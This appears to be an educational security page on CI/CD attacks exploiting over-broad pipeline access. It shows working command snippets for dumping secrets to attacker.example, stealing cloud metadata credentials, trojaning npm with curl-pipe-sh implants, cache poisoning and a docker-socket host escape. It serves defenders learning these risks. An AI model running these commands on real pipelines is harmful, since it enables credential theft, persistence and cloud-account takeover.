# CICD-SEC-5: Insufficient PBAC - Attack Vectors

## Table of Contents
- [Understanding PBAC Attack Vectors](#understanding-pbac-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Excessive Access](#chaining-excessive-access)

## Understanding PBAC Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test.

Insufficient PBAC is rarely exploited through a memory-corruption bug. It is exploited through **execution**: an attacker gets code to run inside a pipeline—via a pull request, a dependency, a test, a build script—and that code simply *uses* the access the runner already holds. The exploit is often a few lines that read an environment variable, curl the cloud metadata endpoint, or write to a shared cache. Because the flaw is in granted access rather than logic, it is cheap to abuse once code runs.

The attacker's goal in this category is usually one of:

- Harvest every secret and credential the runner carries into the job's environment.
- Assume the runner's cloud identity and act with its standing (often broad) permissions.
- Reach systems the build should never touch—production, the control plane, internal networks.
- Leave something behind—a poisoned cache, artifact, or implant—that a higher-trust run will consume or execute.

### Core Attack Flow

```
1. Get code running in the pipeline
   ↓
   PR-triggered build, malicious dependency, poisoned test/build script
2. Enumerate the runner's access
   ↓
   env vars, mounted files, ~/.aws, kubeconfig, metadata endpoint, network
3. Abuse standing privilege
   ↓
   read ALL secrets, assume broad cloud role, reach prod / control plane
4. Persist / pivot
   ↓
   poison shared cache or artifact, implant on non-ephemeral runner,
   move to other pipelines and environments
```

## Common Attack Patterns

### 1. Harvesting All Secrets from a Single Job

When every secret is injected into every job, any code the job runs can dump the whole set.

```bash
# A malicious build/test step simply reads the environment it was handed:
env | grep -Ei 'key|token|secret|password|cred' \
  | curl -s -X POST --data-binary @- https://attacker.example/collect

# Everything the runner injected -- cloud keys, registry tokens, deploy keys,
# signing material -- leaves in one request.
```

**Payoff**: bulk credential theft with no exploit—the job was *given* the secrets it never needed.

### 2. Assuming the Runner's Standing Cloud Role

A runner with a broad attached role hands its identity to any job through the cloud metadata service.

```bash
# From inside the job, borrow the runner's instance credentials:
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# If the role is wildcard, the build step can now do anything in the account:
aws s3 ls          # read every bucket
aws iam create-access-key --user-name admin   # persist
```

**Payoff**: cloud-account access scoped to the *runner*, not the job—compromising one build compromises the account.

### 3. Harvesting Leftover State on a Non-Ephemeral Runner

A reused runner keeps credentials and workspaces from earlier, higher-trust jobs.

```bash
# A later, low-trust job reads what a previous deploy job left on disk:
cat ~/.aws/credentials              # static keys written by a deploy step
cat ~/.docker/config.json           # registry login token
cat ~/.kube/config                  # cluster admin kubeconfig
ls -la /home/runner/_work/          # previous jobs' checked-out source + caches
```

**Payoff**: access to secrets and code from pipelines the attacker was never authorised to touch, purely because the machine was not destroyed.

### 4. Cross-Trust Execution on a Shared Runner

A public repository accepts fork PRs that run on the same runner pool as private, credentialed pipelines.

```bash
# Attacker opens a PR from a fork that edits the build to run their code.
# It executes on a self-hosted runner that ALSO serves the private repo:
whoami; hostname
env                                  # private-pipeline secrets may be present
cat /etc/gitlab-runner/config.toml   # other projects' runner config/tokens
```

**Payoff**: untrusted, attacker-authored code lands on trusted infrastructure and reads what belongs to private projects.

### 5. Poisoned Pipeline Execution (PPE) Amplified by Broad Access

The attacker controls a script the pipeline executes (in-repo build config, Makefile, test hook) and the runner runs it with full standing privilege.

```yaml
# .attacker-controlled build step, run with the runner's identity:
- run: |
    # exfiltrate everything the over-privileged runner can see
    aws sts get-caller-identity
    aws secretsmanager list-secrets --query 'SecretList[].Name'
    for n in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
      aws secretsmanager get-secret-value --secret-id "$n"
    done | curl -s --data-binary @- https://attacker.example/loot
```

**Payoff**: PPE gives execution; insufficient PBAC decides how much that execution can reach. Broad standing access turns a script edit into a full breach.

### 6. Reaching the Control Plane from a Build Job

A build runner with no network segmentation can talk to production and orchestration APIs.

```bash
# The build step was only supposed to compile -- but the network allows:
kubectl --server https://prod-api:6443 get secrets -A       # cluster secrets
kubectl --server https://prod-api:6443 set image deploy/app app=attacker/img  # tamper
psql -h prod-db.internal -c 'SELECT * FROM users LIMIT 10;'  # prod data
```

**Payoff**: direct read/write to production and the cluster, from a job that should have had zero production reach.

### 7. Cache Poisoning Across Runs

A low-trust job writes to a cache that higher-trust pipelines restore as trusted input.

```bash
# Low-trust job populates a shared cache key that deploy pipelines reuse:
mkdir -p ~/.cache/deps
echo 'malicious postinstall' >> ~/.cache/deps/node_modules/.hook
# saved under a cache key like deps-${{ hashFiles('lock') }}

# Later, a privileged deploy job restores the SAME key and executes the payload
# during dependency resolution -- as a trusted step.
```

**Payoff**: persistence and privilege escalation—malicious content written once is consumed by many later, more-trusted runs.

### 8. Artifact Poisoning Between Pipelines

An artifact produced by a low-trust build is deployed, unverified, by a high-trust pipeline.

```yaml
# Build stage (low trust) uploads a tampered binary as an artifact.
# Deploy stage (high trust) downloads and ships it with no signature check:
- uses: download-artifact          # trusts whatever the build produced
- run: ./deploy.sh ./dist/app      # backdoored binary reaches production
```

**Payoff**: supply-chain compromise—the deploy pipeline's trust is lent to an artifact an untrusted job controlled.

### 9. Implanting Persistence on a Reused Runner

On a non-ephemeral runner, an attacker modifies the environment so every future job is affected.

```bash
# One compromised job backdoors the shared runner for all later jobs:
echo 'curl -s https://attacker.example/x | sh' >> ~/.bashrc
cp /usr/local/bin/npm /usr/local/bin/npm.real
printf '#!/bin/sh\ncurl -s https://attacker.example/s | sh\nexec npm.real "$@"\n' > /usr/local/bin/npm
chmod +x /usr/local/bin/npm         # trojaned toolchain for every subsequent build
```

**Payoff**: durable foothold—every job that lands on the runner afterwards runs attacker code with that job's privileges.

### 10. Escaping the Job into the Runner Host / Other Tenants

Weak isolation lets a job break out of its container or read sibling jobs' data.

```bash
# Over-privileged job container mounted the Docker socket:
docker -H unix:///var/run/docker.sock run -v /:/host alpine cat /host/etc/shadow
# Or a privileged container reaches the host and other tenants' workspaces.
```

**Payoff**: full host compromise and cross-tenant access from a container that was granted far more than a build needs.

## Chaining Excessive Access

Individually minor grants combine into full compromise:

```
Fork PR runs on a shared runner        -> attacker code executes on trusted host
        +
All org secrets injected into the job   -> read cloud keys + deploy token
        +
Runner has a standing wildcard role     -> assume the whole cloud account
        =  cloud-account takeover, no application bug required
```

Another common chain:

```
Non-ephemeral runner keeps a kubeconfig -> low-trust job reads it
        -> build job's network reaches the cluster API (no segmentation)
        -> attacker deploys a malicious image to production
        -> poisoned artifact cache spreads the payload to other pipelines
```

## Key Takeaways

1. **Execution plus standing access equals breach**—the attacker rarely needs an exploit, only a way to run code and the privileges the runner already holds.
2. **The metadata endpoint and the environment are the first targets**—they hand over the runner's identity and secrets for free.
3. **Reused runners leak backwards and forwards**—leftover credentials are stolen and new implants poison future jobs.
4. **Shared caches and artifacts carry trust across runs**—poison once, and privileged pipelines consume it.
5. **Small grants chain**—a shared runner plus broad secrets plus a wildcard role equals account takeover with no code exploit at all.

## Next Steps

- **[Prevention Guide](prevention.md)**: Least-privilege, ephemeral, isolated pipeline access
- **[Code Examples](examples.md)**: See secure runner and secret scoping across platforms
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP CI/CD Top 10 lessons
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
